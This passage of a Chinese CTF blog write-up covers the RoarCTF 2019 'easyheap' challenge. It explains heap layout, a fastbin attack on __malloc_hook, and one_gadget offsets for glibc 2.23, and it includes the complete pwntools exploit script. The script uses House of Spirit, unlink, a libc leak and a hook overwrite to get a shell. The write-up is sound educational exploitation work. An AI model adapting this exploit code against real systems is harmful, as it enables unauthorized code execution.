+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">one_gadget libc-2.23.so</span><br><span class="line"># 0x4527a  [rsp+0x30]==0</span><br><span class="line"># 0xf03a4  [rsp+0x50]==0</span><br><span class="line"># 0xf1247  [rsp+0x70]==0</span><br></pre></td></tr></table></figure>
+
+<p>由于我show时申请了0x80,并且当时unsortedbins是有两个chunk,所以他将第一个chunk放进了smallbnins后，才进行的chunk分割</p>
+<p>然后我delete后，heap布局如下：</p>
+<img src="/images/RoarCTF2019_easyheap/Pasted-image-20261013153659.png" alt="Pasted image 20261013153659" width="456" />
+
+<img src="/images/RoarCTF2019_easyheap/Pasted-image-20261013154107.png" alt="Pasted image 20261013154107" width="391" />
+
+<p>我们可以发现，我之前在unlink时埋下的libc_base+0xa0处的伪造chunk,<br>再次帮助到我们了，smallbins处的chunk他覆盖了,unsortbins中的chunk</p>
+<p>我可以从libc_base+0xa0处申请一个0x60大小的chunk,然后放入fastbins,<br>再用smallbins的chunk，修改他的fd指针，从而任意写<br>修改malloc_hook</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(b&#x27;1&#x27;)</span><br><span class="line">p.sendline(str(0x20).encode())</span><br><span class="line">p.send(b&#x27;a&#x27;*0x10)</span><br><span class="line"></span><br><span class="line">p.sendline(b&#x27;1&#x27;)</span><br><span class="line">p.sendline(str(0x60).encode())</span><br><span class="line">p.send(b&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">p.sendline(b&#x27;2&#x27;)</span><br><span class="line"></span><br><span class="line">p.sendline(b&#x27;1&#x27;)</span><br><span class="line">p.sendline(str(0x80).encode())</span><br><span class="line">p.send(b&#x27;a&#x27;*0x80)</span><br><span class="line"></span><br><span class="line">p.sendline(b&#x27;1&#x27;)</span><br><span class="line">p.sendline(str(0x80).encode())</span><br><span class="line">p.send(b&#x27;\x07&#x27;*0x30 + p64(0) + p64(0x71) + p64(malloc_hook - 0x23))</span><br><span class="line"></span><br><span class="line">p.sendline(b&#x27;1&#x27;)</span><br><span class="line">p.sendline(str(0x60).encode())</span><br><span class="line">p.send(b&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">p.sendline(b&#x27;1&#x27;)</span><br><span class="line">p.sendline(str(0x60).encode())</span><br><span class="line">p.send(b&#x27;a&#x27;*0x13 + p64(one))</span><br></pre></td></tr></table></figure>
+
+<p>为什么要先申请一个0x20？<br>因为，我当时一开始，布置fastbins,叠空间时，没算好。<br>导致这里直接申请0x60,分割剩下chunk的fd&#x2F;bk会覆盖libc_base+0x130的chunk头+per_size，<br>那里保存着smallbins中chunk下一个的per_size信息，后续从里面申请空间，修改fastbins头时，<br>会用chunk分割,chunk分割会检查size和下一个per_size是否相等</p>
+<img src="/images/RoarCTF2019_easyheap/Pasted-image-20261013154707.png" alt="Pasted image 20261013154707" width="459" />
+
+<p>那么此时就已经完成malloc_hook的修改，只差触发了<br>但是，如果直接用他的add,来触发malloc_hook,会发现add附近的栈环境中就没NULL；<br>所有用realloc_hook也没用，只能用一些别的来触发malloc_hook</p>
+<p>1.scanf(“%d”)+大量写<br>2.free报错时，会用malloc保留缓存。</p>
+<p>测试发现free附近的栈环境是可以使用的</p>
+<hr>
+<hr>
+<h2 id="完整脚本（exp-py）"><a href="#完整脚本（exp-py）" class="headerlink" title="完整脚本（exp.py）"></a>完整脚本（exp.py）</h2><p>题目录：<code>/home/xi/桌面/pwn/nss/牛/[RoarCTF 2019]easyheap/attachment/exp.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    author: GeekCmore</span></span><br><span class="line"><span class="string">    time: 2026-10-10 11:40:30</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;pwn_patched&quot;</span></span><br><span class="line">libcname = <span class="string">&quot;/home/xi/.config/cpwn/pkgs/2.23-0ubuntu11.3/amd64/libc6_2.23-0ubuntu11.3_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line">container_id = <span class="string">&quot;&quot;</span></span><br><span class="line">proc_name = <span class="string">&quot;&quot;</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b main</span></span><br><span class="line"><span class="string">set debug-file-directory /home/xi/.config/cpwn/pkgs/2.23-0ubuntu11.3/amd64/libc6-dbg_2.23-0ubuntu11.3_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/xi/.config/cpwn/pkgs/2.23-0ubuntu11.3/amd64/glibc-source_2.23-0ubuntu11.3_all/usr/src/glibc/glibc-2.23</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript = gs)</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">elif</span> args.DOCKER:</span><br><span class="line">        <span class="keyword">import</span> docker</span><br><span class="line">        <span class="keyword">from</span> os <span class="keyword">import</span> path</span><br><span class="line">        p = remote(host, port)</span><br><span class="line">        client = docker.from_env()</span><br><span class="line">        container = client.containers.get(container_id=container_id)</span><br><span class="line">        processes_info = container.top()</span><br><span class="line">        titles = processes_info[<span class="string">&#x27;Titles&#x27;</span>]</span><br><span class="line">        processes = [<span class="built_in">dict</span>(<span class="built_in">zip</span>(titles, proc)) <span class="keyword">for</span> proc <span class="keyword">in</span> processes_info[<span class="string">&#x27;Processes&#x27;</span>]]</span><br><span class="line">        target_proc = []</span><br><span class="line">        <span class="keyword">for</span> proc <span class="keyword">in</span> processes:</span><br><span class="line">            cmd = proc.get(<span class="string">&#x27;CMD&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            exe_path = cmd.split()[<span class="number">0</span>] <span class="keyword">if</span> cmd <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">            exe_name = path.basename(exe_path)</span><br><span class="line">            <span class="keyword">if</span> exe_name == proc_name:</span><br><span class="line">                target_proc.append(proc)</span><br><span class="line">        idx = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(target_proc) &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(target_proc):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span> =&gt; <span class="subst">&#123;v&#125;</span>&quot;</span>)</span><br><span class="line">            idx = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">f&quot;Which one:&quot;</span>))</span><br><span class="line">        <span class="keyword">import</span> tempfile</span><br><span class="line">        <span class="keyword">with</span> tempfile.NamedTemporaryFile(prefix = <span class="string">&#x27;cpwn-gdbscript-&#x27;</span>, delete=<span class="literal">False</span>, suffix = <span class="string">&#x27;.gdb&#x27;</span>, mode = <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> tmp:</span><br><span class="line">            tmp.write(<span class="string">f&#x27;shell rm <span class="subst">&#123;tmp.name&#125;</span>\n<span class="subst">&#123;gs&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(tmp.name)</span><br><span class="line">        run_in_new_terminal([<span class="string">&quot;sudo&quot;</span>, <span class="string">&quot;gdb&quot;</span>, <span class="string">&quot;-p&quot;</span>, target_proc[idx][<span class="string">&#x27;PID&#x27;</span>], <span class="string">&quot;-x&quot;</span>, tmp.name])</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">p = start()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,connect</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;input the size\n&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;content\n&#x27;</span>,connect)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calloc_free</span>(<span class="params">xuan,connect</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;666&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;free?\n&#x27;</span>,<span class="built_in">str</span>(xuan).encode())</span><br><span class="line">    <span class="keyword">if</span>(xuan==<span class="number">1</span>):</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;content\n&#x27;</span>,connect)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># Your exploit here</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;username:&#x27;</span>)</span><br><span class="line">p.send(p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x41</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;info:&#x27;</span>)</span><br><span class="line">p.send(p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x40</span>)+p64(<span class="number">0x41</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span>)</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x58</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x58</span>)</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0x90</span>)+p64(<span class="number">0x31</span>))</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,p64(<span class="number">0x30</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x58</span>,<span class="string">b&#x27;h&#x27;</span>*<span class="number">0x58</span>)</span><br><span class="line">delete()</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0x602098</span>-<span class="number">0x18</span>)+p64(<span class="number">0x602098</span>-<span class="number">0x10</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x90</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(<span class="number">0x90</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">calloc_free(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">calloc_free(<span class="number">2</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x602080</span>) + p64(<span class="number">0xdeadbeefdeadbeef</span>))</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># show 后 close(1)/close(2)，后面盲发</span></span><br><span class="line">leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_addr = leak - <span class="number">0x3c4b78</span>  <span class="comment"># main_arena+88</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_addr:&quot;</span>, <span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># one: 0xf03a4 / 0x4527a / 0xf1247；add 栈过不了，最后用 free 触发</span></span><br><span class="line">one_off = <span class="built_in">int</span>(args.one, <span class="number">16</span>) <span class="keyword">if</span> args.one <span class="keyword">else</span> <span class="number">0xf03a4</span></span><br><span class="line">one = libc_addr + one_off</span><br><span class="line">malloc_hook = libc_addr + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;malloc_hook:&quot;</span>, <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;one:&quot;</span>, <span class="built_in">hex</span>(one))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x20</span>).encode())</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x60</span>).encode())</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x80</span>).encode())</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x80</span>).encode())</span><br><span class="line">p.send(<span class="string">b&#x27;\x07&#x27;</span>*<span class="number">0x30</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(malloc_hook - <span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x60</span>).encode())</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pad 0x13 写 __malloc_hook = one</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x60</span>).encode())</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span> + p64(one))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 非法 free → malloc_printerr → malloc → one</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+    </div>
+    <footer class="article-footer">
+        <a class="article-category-link" href="/categories/PWN/" title="PWN" data-aos="zoom-in">PWN</a>
+
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/House-of-Spirit/" rel="tag" title="House of Spirit">House of Spirit</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/PWN/" rel="tag" title="PWN">PWN</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/glibc-2-23/" rel="tag" title="glibc-2.23">glibc-2.23</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/unlink/" rel="tag" title="unlink">unlink</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/" rel="tag" title="堆溢出">堆溢出</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+    <div class="article-nav-link-wrap right">
+        <img data-src="/images/newpapername/Pasted-image-20260928192933.png" data-sizes="auto" alt="TP-Link SR20 TDDP 漏洞案例复现" class="lazyload">
+      <a href="/2026/10/09/newpapername/" aria-label="后一篇: TP-Link SR20 TDDP 漏洞案例复现"  title="后一篇: TP-Link SR20 TDDP 漏洞案例复现"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          TP-Link SR20 TDDP 漏洞案例复现
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2026
+        <span class="footer-info-sep rotate"></span>
+      爱瞎捣鼓的xibao
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        6.3k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        00:32
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E%E4%B8%8E%E8%AF%B4%E6%98%8E"><span class="toc-number">1.</span> <span class="toc-text">免责声明与说明</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RoarCTF-2019-easyheap"><span class="toc-number">2.</span> <span class="toc-text">RoarCTF 2019 easyheap</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E9%9D%A2%E8%A7%82%E5%AF%9F%EF%BC%88%E6%9C%AC%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%89"><span class="toc-number">2.1.</span> <span class="toc-text">题面观察（本题思路）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-username-info-%E5%81%87%E5%9D%97%EF%BC%88House-of-Spirit%EF%BC%89"><span class="toc-number">2.2.</span> <span class="toc-text">1. username &#x2F; info 假块（House of Spirit）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%95%B4%E7%90%86%E5%A0%86-%E8%B6%85%E9%95%BF-scanf-%E8%A7%A6%E5%8F%91-consolidate"><span class="toc-number">2.3.</span> <span class="toc-text">2. 整理堆 + 超长 scanf 触发 consolidate</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-unlink-%E5%8A%AB%E6%8C%81-gift-%E6%8C%87%E9%92%88"><span class="toc-number">2.4.</span> <span class="toc-text">3. unlink 劫持 gift 指针</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%86%99%E4%B8%BB%E6%8C%87%E9%92%88-magic%EF%BC%8Cleak-libc"><span class="toc-number">2.5.</span> <span class="toc-text">4. 写主指针 + magic，leak libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-fastbin-%E6%89%93%E5%88%B0-malloc-hook-0x23"><span class="toc-number">2.6.</span> <span class="toc-text">5. fastbin 打到 __malloc_hook-0x23</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E8%84%9A%E6%9C%AC%EF%BC%88exp-py%EF%BC%89"><span class="toc-number">2.7.</span> <span class="toc-text">完整脚本（exp.py）</span></a></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="爱瞎捣鼓的xibao" class="lazyload">
+  <div class="sidebar-author-name">爱瞎捣鼓的xibao</div>
+  <div class="sidebar-description">笔记与漏洞复现</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">8</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "爱瞎捣鼓的xibao",
+          title: "RoarCTF 2019 easyheap",
+          url: "https://aixiadaogudexibao.github.io/2026/10/13/RoarCTF2019_easyheap/",
+          excerpt: "",
+          description: "",
